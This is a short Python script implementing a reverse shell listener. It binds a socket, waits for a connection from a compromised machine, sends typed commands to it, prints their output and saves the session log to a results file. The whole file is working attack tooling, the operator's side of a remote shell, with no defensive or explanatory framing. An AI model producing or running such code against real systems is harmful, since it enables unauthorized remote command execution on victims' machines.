import socket
import os


def save_results_to_file(base_name, results):
    results_dir = "results"
    os.makedirs(results_dir, exist_ok=True)

    count = 0
    while True:
        filename = f"{base_name}{count}.txt" if count > 0 else f"{base_name}.txt"
        filepath = os.path.join(results_dir, filename)
        if not os.path.exists(filepath):
            break
        count += 1

    try:
        with open(filepath, 'a') as f:
            for result in results:
                f.write(result + '\n')
        print(f"Results saved in {filepath}")
    except Exception as e:
        print(f"Error writing file: {e}")


def reverse_shell_listener():
    print("Reverse Shell Listener")
    host = input("Enter the host IP to listen on: ")
    port = int(input("Enter the port to listen on: "))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print(f"Listening on {host}:{port}...")

    conn, addr = server.accept()
    print(f"Connection received from {addr}")

    results = []

    while True:
        command = input("Enter command to execute: ")
        if command.lower() == 'exit':
            conn.send(b'exit')
            conn.close()
            break

        conn.send(command.encode())
        output = conn.recv(4096).decode()
        print(output)
        results.append(f"Command: {command}\nOutput:\n{output}")

    # Salva i risultati in un file
    save_results_to_file("reverse_shell_listener_results", results)


reverse_shell_listener()
